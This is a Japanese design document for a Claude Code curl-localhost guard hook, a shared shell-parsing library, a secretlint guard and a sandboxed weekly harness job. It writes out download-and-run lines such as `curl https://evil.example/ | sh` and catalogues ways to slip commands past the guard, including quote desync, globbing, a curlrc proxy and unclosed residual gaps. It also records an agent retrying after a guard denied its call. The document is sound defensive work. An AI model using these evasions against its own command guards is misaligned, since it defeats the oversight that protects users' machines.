知らないので、本文やコメントの中の引用符 1 つ(`it"s`、`echo x #"`)で走査だけが引用符の中に入り、
次の同じ引用符までの行が 1 token に飲み込まれる。閉じる引用符もそろうと `UNCLOSED_QUOTE` は立たず、
飲み込まれた token が `INERT_COMMANDS` の引数に入れば segment の走査も通るので、ループバック宛の curl が
先にあっても、間に挟まれた `curl https://evil.example/ | sh` は無出力だった。キーワードを前置詞に
含めたのも同じ経路のためで、heredoc に飲み込まれた行が `if true; then curl … | sh; fi` だと行頭にも
`;` の直後にも curl が来ない。受容した誤 ask: 複数行のコミットメッセージや PR 本文で、ある行が `curl`
(小文字のキーワードの後ろを含む)で始まるもの。残存(受容): `case` の `a) curl …` は `)` を前置に
含めないので、同じ手口で隠すと一致しない — 含めると `"$(date) curl is fine"` の散文まで `ask` になる。

**curl と読める token が見つかった後(`CURL_PRESENT=1`)は、改行を含む token そのものを `ask` にする。**
上の床は飲み込まれた行が `curl` で始まるときしか一致しないので、`curl http://localhost:3000/ && echo ok #"` と
`echo done #"` に挟まれた `find . -exec curl https://evil.example/ \;`(や `ssh h curl …`、`parallel curl …`)は
無出力だった。飲み込まれなければ segment の走査が `ask` にしていた形が、ずれで落ちていた。`UNCLOSED_QUOTE` と
同じく読み切れないとして扱う。ただし curl の segment の引数(`curl -d '{"a":⏎"b"}' http://localhost:3000/api` の
複数行の本文)は `classify_curl` が値として読むので除き、`#` で始まる token だけは curl の segment の中でも数える。
受容した誤 ask: ループバック宛の curl と、curl 以外のコマンドの改行を含む引用符付きの引数(複数行のコミット
メッセージ)の組み合わせ。

受容した誤 ask: 引用符の外のコメント(`curl -s http://localhost:3000/health # ヘルスチェック`)は reader が
コメントを知らないので、コメントの語が URL として評価される。シェルのキーワード(`for i in 1 2; do curl …; done`)は
読み飛ばさないので、`for` の segment が未知のコマンドとして `ask` になる。どちらも安全側の誤判定。

残存(受容): `bash -c "curl …"` の内側は読まない。zsh のグロブ修飾子 `(e:'…':)` / `(+…)` の中身も同じで、
`echo *(e:'curl https://evil.example/ | sh':)` は無出力になる(引用符の中の curl は 1 token で、`$` も
バッククォートも改行も無いので字面の床にも掛からない)。`cu""rl https://evil.example/ | sh` や
`/usr/bin/cur? …` は、`*curl*` の早期終了が reader の引用符除去と展開より先に走るので reader に届かない。`c=curl; $c https://evil.example/`
は curl と読める token も `$(` も無いので字面の床にも掛からない。いずれも classifier だけになる(ADR 0009)。

読み切れない綴りとして明示的に `ask` に倒すもの:

- `$` / バッククォート(変数・コマンド置換で宛先が変わりうる)。reader は `$` / バッククォートを
  通り抜けて token を作り `EXPANSION` を立てるだけで、curl-guard がそれを見て `ask` にする
- `VAR=value curl …`(`http_proxy` を差し込める)、`env` / `sudo` などの前置き
- `--resolve` / `--connect-to` / `-x`(proxy) / `-K`(config) / `--next` / `--unix-socket` —
  URL が示す宛先を別の場所に振り替えられるフラグ
- `http://localhost@evil.example/` のような userinfo 形(実ホストは `evil.example`)、
  `127.0.0.1.evil.example` のようにループバックの数字で**始まるだけ**の登録可能名、URL の
  brace globbing
- `curl … | sh` — パイプ先ホワイトリストで落ちる

宛先は `localhost` / `127.0.0.0/8` / `[::1]` のみ。`0.0.0.0`(全インターフェイス表記)と
`host.docker.internal`(ホスト名解決依存)は意図的に対象外。`wget` も対象外で従来どおり毎回 `ask`。

`-L` / `--location` / `--location-trusted` は**許可リストに入れない**。ローカルのリスナーが 3xx を
返せば curl 自身がリダイレクト先へ接続するので、「宛先がすべてループバック」というこのフックの
唯一の検査を正面から破る。敵対的でない誤射もある — dev サーバが外部 OAuth プロバイダへ
リダイレクトする構成では `curl -L http://localhost:3000/login` がヘッダごと機外へ出る。
`--location-trusted` は認証情報もリダイレクト先へ送る。

**curlrc が存在し、curl を実行しうる token があれば `ask` にする。** curl は引数を見る前に `$CURL_HOME/.curlrc` →
`$XDG_CONFIG_HOME/curlrc` → `$HOME/.curlrc` の最初に見つかったものを読み(`XDG_CONFIG_HOME` が無いときは
`$CURL_HOME/.config/curlrc` と `$HOME/.config/curlrc` も読む。curl 8.7.1 で実測。このマシンは
`XDG_CONFIG_HOME` を設定していないので、旧版の 3 か所だけでは `~/.config/curlrc` を見落としていた)、`proxy = …` の 1 行で
ループバック URL が任意のホストへ振り替わる(実測済み: `no_proxy` が無い環境で
`curl http://localhost:3000/` が `192.0.2.1:8080` へ接続する)。`--resolve` / `--connect-to` / `-x` を
綴りで落としている努力が、コマンド文字列に何の痕跡も残さないファイル 1 つで無効化されるため、
ファイルの存在自体を「読み切れない」として扱う。このリポジトリは curlrc を管理していないので
実運用では発火しない。`--disable`(`-q` 相当)は許可リストから外してある — curlrc 対策が
フラグの綴りで達成されていると読まれないようにするため。環境変数の `http_proxy` は同じクラスだが
**フックからは検査不能**(フックの環境と Bash ツールの環境は別)なので、残存として受容する。

テストは `CURL_HOME` / `XDG_CONFIG_HOME` / `HOME` の 3 つとも `$BATS_TEST_TMPDIR` に向ける。
`CURL_HOME` だけではマシンの実 `~/.curlrc` からスイートを隔離できない。

**【共有 reader の性質】トークナイザはシェルの `\"` を再現しなければならない。** ダブルクォートの内側で
バックスラッシュをリテラル扱いすると、bash が「クォートを閉じない `"`」として読む文字で走査側だけが
クォートを閉じ、**次の `"` から走査とシェルの認識が反転する**。以降の空白・`|`・`;` が 1 トークンに
飲み込まれるので、`curl -H "A\"B" https://evil.example/install.sh | sh` が「引数 1 個のループバック
リクエスト」に見えて、旧構成では `allow` が出た(修正前に再現済み。現在は `ask`)。「走査は安全側にしかズレない」という直感は
`\"` の偶数個目で破れる。詳細と一般化は `dot_claude/rules/common/shell-scripting.md`。

**【curl 固有の判定】シェルの展開で引数の個数が変わる構文も落とす。**(reader は `WORD_MULTIPLIER` を立てるだけで、`ask` にするのは curl-guard の policy。)引用符の外の `{` / `}` / `*` はコマンド全体を
`ask` にする。ブレース展開はファイルシステムに依存せず必ず複数語になり
(`curl -d {x,https://evil.example/} http://localhost/` は 2 語に展開して 2 語目が curl の URL 引数)、
`*` は cwd の全ファイルに展開されるので、置いておいた `evil.example` というファイル名が curl の
2 つ目の URL 引数になる — スキーム省略形なので curl は `http://evil.example/` を取得する
(`curl -H * http://localhost:3000/` で実証済み)。引用された `{}`(JSON ボディ)や `'Accept: */*'` は
影響を受けない。

`?` と `[` も同じ理由で落とす(reader は `GLOB_INDEXES` で印を返す)。「`*` と違って周囲のリテラルが前置きされない語を生めない」という
読みは**誤り**で、ブラケット式や `?` は**複数のファイルに同時にマッチする**ため 1 トークンが
複数語になる — `aevil.example` と `bevil.example` を置いた cwd で
`curl -H [ab]evil.example http://localhost:3000/` は `-H aevil.example` と
**2 つ目の URL 引数 `bevil.example`**(スキーム省略形なので http)に展開される。ただし全面拒否だと
`…/api?a=1` と `[::1]` 形まで巻き添えになるので、**トークンに印を付けて curl セグメントでだけ判定する**
形にしてある(`glob_token_is_loopback_safe`): そのトークン自身がループバック URL で、かつ
**authority 部分に glob が無い**ときだけ通す。この条件下では展開結果も必ず
`http://localhost:3000/` で始まるので宛先は変わらない。`http://localhost?x` は authority 側の
glob なので落ちる(ホスト名が伸びうる)。`jq .[0]` のような inert セグメントの glob は curl の引数に
ならないので判定しない。この扱いが下の残存 2 つと**種類が違う**点に注意: あちらは宛先チェックの
外側の副作用を縛らないという話だが、glob はチェックしている不変条件そのものを破る。だから
残存にせず拒否する。

**【共有 reader の性質】SEP 番兵は入力側で検知する。** セグメント区切りに使う `$'\x01'` が入力に書かれていると、
シェルには存在しないセグメント境界を注入できる(`curl URL <0x01> echo https://evil.example/` が
「ループバック curl + 無害な echo」に見えるが、bash はリモート URL を curl に渡す)。

**`--data-urlencode` の `@` は先頭だけではない。** `name@file` の形でローカルファイルを読むので、
このフラグに限り値のどこに `@` があっても落とす。`-d @file` の先頭一致だけでは塞がらない。
値の検査は `value_reads_local_input` 1 か所にまとめてあり、値を別の token に書いた形・`--flag=値`・
短オプションに付けた形(`-XPOST`、`-d@file`。curl は束の途中の値を取る文字から後ろを値として読む)の
すべてが同じ規則を通る。`-` は標準入力なので落とすが、`-o -` / `--output=-` だけは標準出力への書き出しなので通す。

**【共有 reader の性質】長さで打ち切る。** 走査は O(n²) で、`matcher: "Bash"` のため **curl を実行しないコマンドでも
本文に "curl" と書いてあれば全文を走る**。修正前は curl に言及する 15,062 文字の
`gh pr create --body '…'`(この変更を説明する PR 本文がまさにこの形)で 1.86 秒かかっていた。
8192 byte(`LC_ALL=C` で数える)を超える入力は reader が `TOO_LONG` を立てて token を作らず(実測 0.01 秒)、
curl-guard は行単位の字面の床(線形)だけを生のコマンドに当てる。一致しなければ無出力。

【共有 reader の性質】トークナイザは `read -ra` ではなく**クォート解釈を持つ自前の走査**。`read -ra` は空白でしか
割らないので `-H "Accept: application/json"` が2トークンに割れ、後半が URL として読まれて
正当なリクエストが黙ってプロンプトに落ちる(実際に初版で踏んだ)。逆に `-d '{"a":"x|y"}'` の
`|` をパイプと誤読する問題も同じ走査で消える。リダイレクトは fd 数字を演算子トークンに
くっつけて1トークンにまとめる — `2>&1` から `1` が孤立すると、それが URL として読まれる。

残存(受容): ループバックのリスナーは外部への中継になりうるので、「宛先アドレスがループバック」は
最終到達先の保証ではない。ただし `Bash(python3:*)` が既に `allow` にあって同じソケットを開けるため
**これで新たな到達性が増えるわけではない**。nono 側の同じ経路は `dot_config/nono/CLAUDE.md` の
`open_port: [0]` に記載がある。

残存(受容): **保証するのは宛先アドレスであって副作用ではない。** `-o` / `--output` / `-O` /
`--dump-header` / `-c` / `-w "%output{…}"`(curl 8.3+)と `>` / `>>` はいずれも制限していないので、
ローカルに立てたリスナーの応答を任意のパスへ書ける — **このガードスクリプト自身の上書きを含む**。
受容する理由は上と同じで、`Bash(cp:*)` / `Bash(mv:*)` / `Bash(python3:*)` が既に `allow` にあり
同じ書き込みができるため新たな到達性が増えない。なお nono ラッパー経路では nono のポリシーが、
素の Claude Code 経路ではネイティブ Bash サンドボックスの write allowlist(`$HOME` 直下は含まない)が
OS レベルの床になるが、**フックはその床に依存していない** — サンドボックス外の launch path には
床が無い。

Source 上の配線は git-push-guard と同じく `just test-settings-hooks`(`test/settings-hooks.bats`)が固定している。
フック自身の判定は `just test-scripts`(`test/curl-localhost-guard.bats`)がテストする。git-push-guard と同じく
**対で書くこと** — ここでは「`ask` になるべきケース」だけを書くと「常に ask するフック」が
全件通過してしまうので、無出力になるべきケースを必ず並べる。macOS の bash 3.2 でも動くこと
(`mapfile` なし・空配列展開なし)を実機で確認済み。

**shell command reader** — `dot_claude/scripts/lib/shell-reader.bash` は、Bash ツールのコマンド文字列を
読む処理を git-push-guard と curl-localhost-guard で共有するための source 専用ライブラリ
(`test/shell-reader.bats` が単体でテストする)。`set` は呼び出し側に従う。

- **interface。** ブレース展開を始めうる `{`(後ろが空白でないもの)の直後の token の index を
  `SHELL_READER_BRACE_INDEXES` で返す(git-push-guard が segment ごとに照合する)。
  引用符の外の redirect 演算子の token の index を `SHELL_READER_OPERATOR_INDEXES` で返す — 引用された
  `">"` や `\>` は引数なのに演算子と同じ字面の token になるので、redirect の対象を読み飛ばす側
  (curl-guard)はこれを見る。字面で読むと `curl http://localhost/ ">" https://evil.example/x` の
  2 つ目の URL を redirect の対象として読み飛ばし、無出力になっていた。
  heredoc 演算子(引用符の外の `<<` / `<<-`)の最初の `<` の token の index を `SHELL_READER_HEREDOC_INDEXES` で
  返す。here-string の `<<<` と `< <(…)` も `<`, `<` の token になるので、token 列からは区別できない(git-push-guard の
  heredoc 本文の格下げが使う)。
  `shell_reader_read <文字列>` が引用符を外した token 列(`SHELL_READER_TOKENS`。
  セグメントの境目は `SHELL_READER_SEP` 番兵、リダイレクトは fd の数字ごと 1 token)と、読み切れなかった
  理由の flag(`TOO_LONG` / `EXPANSION` / `WORD_MULTIPLIER` / `SEP_IN_INPUT` / `UNCLOSED_QUOTE`)、
  引用符の外の `*` / `?` / `[` を含む token の `GLOB_INDEXES` を global に返す。fd の数字として
  演算子に付けるのは引用の無い数字だけ(`"2">x` / `\2>x` の `2` は bash でも zsh でも引数で、curl には
  数字だけのホスト = IPv4 アドレスの URL になる)。zsh の語頭の `=(…)` も `PROCESS_SUBSTITUTION` にする。
  `shell_reader_any_line_matches <文字列> <ERE>…` は、引用符と backslash を外し行継続をつないだうえで
  (つなぐ前の各行も残す)、すべての正規表現に一致する行があるかを返す(各フックの字面の床が使う。判定の正規表現は呼び出し側が渡す)。
  `shell_reader_each_segment <callback>` がセグメントごとに callback を呼び(先頭 index は
  `SHELL_READER_SEGMENT_START`)。「読み切れた」の定義は呼び出し側ごとに違う(curl-guard は flag を 1 つずつ
  見て glob は curl セグメントでだけ判定し、git-push-guard は読み切れるかを判定しない)ので、それを 1 つに
  まとめる述語は lib に置かない。
  each_segment の local は `_sr_` 接頭辞なので、callback はその接頭辞以外の名前を自由に使える。
- **判定をしない。flag が立っても token は最後まで作る。** 緩める判定(curl のループバック確認)は flag を
  見て諦め、塞ぐ判定(git push の危険な綴り)は同じ token から読み続けられるようにするため。reader が
  判定まで持つと、どちらか一方の向きに合わせた作りになる(ADR 0009)。`TOO_LONG` だけは token を作らない。
- **`$'…'`(ANSI-C quoting)は bash と同じ規則で読む。** 中では backslash が `'` もエスケープする。
  普通の `'…'` として読むと、`$'\''` の 2 つ目の `'` で走査だけが閉じて 3 つ目で開き、
  `echo $'\''; curl https://evil.example/ | sh; echo \'` の引用符の外の部分が 1 token に飲み込まれて
  両フックとも素通りしていた(git-push-guard の force push 版は `ask` 止まり。今は `deny`)。`$` は token に
  残すので、`$'\x2d-force'` のようにエスケープが中身を作る綴りは呼び出し側が「`$` を含む token」として
  扱える。`$$` は PID の parameter なので 2 文字まとめて文字として読み(`$$'\'` の `'\'` は普通の引用符)、
  `\$'` は backslash の分岐が `$` を消費する。heredoc とコメントは読まない(各フックの字面の床が改行を
  含む token で拾う。reader に heredoc を教えるのは変更が大きすぎるため見送った)。
- **`LC_ALL=C` と byte 数の上限。** 走査は byte 単位(多バイトのロケールで `${s:i:1}` が先頭から数え直して
  二乗で遅くなるのを避ける)。上限 8192 は byte で数えるので、呼び出し側のロケールに依存しない。
- **読み込みに失敗したとき。** 各フックは `[[ -r … ]]` と `"$BASH" -n` で確かめてから `source` し、その後
  `declare -F shell_reader_read shell_reader_each_segment shell_reader_any_line_matches` で関数がそろったことを確かめる。どの失敗経路
  (無い・構文エラー・空や途中で切れた lib・source の失敗)でも `ask` を返す(git-push は判定不能を
  素通りさせない、curl も curl の有無を確かめられないため)。テストは各フックの bats にある
  (lib の無いコピー・空の lib・構文エラーの lib)。

**secretlint guard hook** — `dot_claude/scripts/executable_secretlint-guard.sh` は `PostToolUse`(`matcher: "Write"`)で走り、`.env` / `*credentials*` / `*secret*` に一致するパスへの書き込みだけを secretlint に通す。対象パスは stdin JSON の `tool_input.file_path` で受け取る — `$CLAUDE_FILE` という環境変数は存在せず、それを読んでいた旧インライン版は 2026-03-06 の導入以来一度も発火していなかった(2026-09-25 の prompt-audit で判明。同時に旧 format フックは削除。変数だけ直して戻すと全プロジェクトの .ts 編集ごとに `pnpm lint:fix` が走り、script の無いリポジトリでは失敗するので、戻すなら外部スクリプト + `pnpm run --if-present` ガード + bats テストにする)。検出時は `exit 2` で stderr をモデルに返す(`exit 1` はユーザーにしか見えない)。`jq` / `secretlint` が無ければ無出力で exit 0。`just test-scripts`(`test/secretlint-guard.bats`)が偽の secretlint で対を検証する。

**Weekly harness job** — `dot_claude/scripts/executable_harness-weekly.sh` は自己改善ループの週次ジョブの入口(ADR 0012、#398)。launchd(`private_Library/LaunchAgents/local.dotfiles.harness-weekly.plist.tmpl`、土曜 10:00、`RunAtLoad` は false)が `WorkingDirectory` を `~/.claude/harness` にして `nono run --profile claude-seal -- /bin/bash ~/.claude/scripts/harness-weekly.sh`(`--allow-cwd` は付けない。`WorkingDirectory` は nono の内側から symlink に差し替えられ、付けると差し替え先に read+write が付与されるため。`~/.claude` は claude-seal が付与しているので無くても動く) を起動し、スクリプトは nono の内側で `claude -p …` を直接呼ぶ。claude に渡すフラグは `dot_config/zsh/sandbox.zsh` の wrapper と同じ(`--settings '{"sandbox":{"enabled":false}}'` と `--dangerously-skip-permissions`)に、`--max-budget-usd`(既定 5、`HARNESS_WEEKLY_BUDGET_USD`)・`--session-id`・`--output-format json` を足したもの。
- **nono は plist で掛ける**: launchd は zsh の wrapper を通らないので、nono は明示しないと掛からない。スクリプトの中で掛けないのは、スクリプトが `~/.claude` 配下にあって nono の内側から書き換えられるため。スクリプトで掛けると、書き換えられた内容が次の土曜に境界の外で無人実行される(`dot_config/nono/CLAUDE.md` の「境界の外で無人実行するもの」)。スクリプトは `INSIDE_NONO_SANDBOX` が無ければ実行を拒む(誤用を止めるためのもので境界ではない)。手動で回すときはターミナルから `launchctl kickstart gui/$(id -u)/local.dotfiles.harness-weekly` を使う。
- **成功の判定**は exit 0 かつ結果の `is_error == false`。予算切れなどの run は exit 0 でも `is_error` が立ちうるので終了コードだけを見ない。成功時だけ `~/.claude/harness/weekly-heartbeat`(epoch)を tmp+mv で書く。`state.json` に入れないのは、trigger と reflect も `state.json` を書き換えるため(lost update)。
- **予算と件数**: 1 回で扱うセッション数はプロンプトで上限を置き(既定 10、`HARNESS_WEEKLY_MAX_SESSIONS`)、予算は歯止めにする。予算だけだと、溜まった分を捌けない週は毎回予算切れで失敗し、進んでいても heartbeat が書かれない。既定値の根拠: Bash を 1 回呼ぶだけの実行でも固定の文脈で $0.43 かかる(2026-10-02)。最終構成での最初の実行(2026-10-03、pending 16 件のうち上限の 10 件を処理)は `total_cost_usd` $1.20 で、既定の予算 $5 に届かずに終わった。予算切れの run は exit 1・`subtype: error_max_budget_usd`・`is_error: true` で終わる(実測は Contrast Pair の項)ので、失敗として扱われ heartbeat は書かれない。
- **自分のセッションの除外は 2 段**: `HARNESS_DISABLE=1` で SessionEnd trigger に積ませず、加えて起動前に `weekly-sessions.txt` へ記録した session id を pending から実行の前後に外す。後者は環境変数が nono や hook まで届かなかった場合と、SIGKILL で後片付けの trap が動かなかった前回の積み残しのため。
- **再実行の安全性**: `weekly.lock/`(中に PID)で同時実行を防ぎ、持ち主が死んだ lock は取り戻す。nono の内側では `ps` が拒否され、別の nono インスタンスや境界の外のプロセスへの `kill -0` は EPERM になる(どちらも実測)ので、EPERM は生存とみなす(死んだとみなすと並走する)。PID が無関係のプロセスに再利用されると EPERM が返り続けるので、1 日より古い lock は持ち主の生死に関わらず取り戻す。起動は週 1 回なので、次の起動では必ず取り戻せる。プロンプトでセッションごとに「queue へ追記 → pending から外す」を済ませてから次へ進ませるので、途中で止まっても失うのは高々 1 セッション分。pending を読み取れなかったとき(grep の終了コード 2 以上)は pending を書き換えずに失敗する。外す行が無いとき(`HARNESS_DISABLE` が効いた通常の run)は pending を置き換えない。置き換え(`mv`)は SessionEnd hook の追記と競合して行を失いうるため。
- **lock が防ぐのは週次ジョブ同士だけ**: 対話セッションの `/harness-reflect` や `/harness-review` と同時に走ると、pending と queue の書き換えが競合しうる。土曜 10:00 の起動と手動の reflect が重なる場合に限るので受容している。
- **pending が空の週は claude を起動しない**: 起動するだけで固定の文脈分(約 $0.4)がかかるため。この場合も heartbeat は書く。heartbeat は「claude と認証の経路が動いた」ではなく「ジョブが健全に回った」の意味になる。
- ログは `~/Library/Logs/harness-weekly.log`。run ごとに `harness-weekly: start <時刻> session=<id> pending=<件数>` と、EXIT trap から `harness-weekly: end <時刻> session=<id> exit=<終了コード> pending=<前>-><後>` を出す。処理件数を claude の結果の要約文に頼らず pending の行数の前後で残すのは、予算切れなど失敗の run の結果には要約文が無いため(SIGKILL された run は end の行を残さない)。briefing / doctor は plist が置かれたマシンでだけ heartbeat を見る(古さの閾値 8 日は両スクリプトで揃える)。テストは `test/harness-weekly.bats`(nono / claude / uuidgen をスタブにする)。
- **nono の内側での前提の実測(nono 0.79.0)。** 一時ラベルで launchd に登録し、plist から `nono run --profile claude-seal --allow-cwd -- /bin/bash <プローブ>` を起動した(`--allow-cwd` を外した最終形は、`~/.claude/harness` を cwd にすると付与されて書き込めること、付与の無い cwd(`~/Library/LaunchAgents`)では cwd が `/` になり書き込みが拒否されることを、非対話の `nono run` で別に確かめた)。`INSIDE_NONO_SANDBOX=1`、cwd は `WorkingDirectory`、launchd から継承した stdout(nono では書き込み DENIED の `~/Library/Logs`)に書ける、`uuidgen` / `mktemp` / `jq` は動く。`ps` は `Operation not permitted`(exit 126)、別の nono インスタンスのプロセスと PID 1 への `kill -0` は `Operation not permitted`、存在しない PID には `No such process`。
- **最終構成での通し実行(2026-10-03、nono 0.79.0)。** `chezmoi apply` で登録された本番のラベルを launchd から起動し、claude の起動まで通った。`launchctl print` は `runs = 1`・`last exit code = 0`、ログは `exit=0 pending=16->6`、結果は `is_error: false`・`subtype: success`、heartbeat は end の時刻で書かれた。境界の外の起動との比較(Contrast Pair)は、スクリプトの中で nono を掛けていた構成での次項の測定による。nono の内側から orca の hook スクリプトの読み取りが拒否されたが、hook は読めないときに `{}` を返すだけなので影響は無い。plist の読み取りも拒否されていた(いまは `read_file` で付与済み。`dot_config/nono/CLAUDE.md` の「境界の外で無人実行するもの」)。Bash 呼び出しが 1 回 `permission_denials` に入った。原因は git push guard で、queue に追記するヒアドキュメントの本文の `git push` という文字列を push と読んで `ask` を返し、headless では `ask` が拒否になる。エージェントが別の形で再試行したので、queue への追記は済んでいた。
- **実機の Contrast Pair(2026-10-02〜03、nono 0.78.0 / Claude Code 2.1.287。スクリプトの中で nono を掛けていた構成での測定)。** 一時ラベルで launchd に登録し、同じプロンプト(Bash を 1 回呼び、`INSIDE_NONO_SANDBOX` と `HARNESS_DISABLE` を出す)を nono で包んだ起動と包まない起動で実行した。
  - **nono で包まない側**: 成功(`is_error: false`)。`INSIDE_NONO_SANDBOX=unset HARNESS_DISABLE=1`。費用 $0.43。
  - **nono で包んだ側**: 成功(`is_error: false`)。`INSIDE_NONO_SANDBOX=1 HARNESS_DISABLE=1` で、Bash は入れ子のサンドボックスで落ちず(exit 71 なし)、`HARNESS_DISABLE` は nono を越えて子プロセスまで届いた。結果の `session_id` は `--session-id` で渡した値と一致した。費用 $0.38。
  - **認証が切れた run** は `Not logged in` で、結果は `subtype: success` のまま `is_error: true` になる(#418。launchd に固有ではなく、対話の wrapper 経由の `claude` も同じく未ログインになり、ログインし直すと両方とも直る)。終了コードではなく `is_error` を見るのはこのため。認証が切れると週次ジョブは黙らずに失敗し、heartbeat の古さとして briefing に出る。
  - **予算切れの run**: nono の内側で `--max-budget-usd 0.01` にして Bash を 3 回呼ばせると、exit 1・`subtype: error_max_budget_usd`・`is_error: true`・`errors: ["Reached maximum budget ($0.01)"]` で終わった。ただし `total_cost_usd` は $0.35 で、上限はターンの区切りでしか確かめられないため、1 ターン分の費用だけ超えうる。`--max-budget-usd` は厳密な上限ではなく、超えたら次のターンに進まない歯止めとして読むこと。
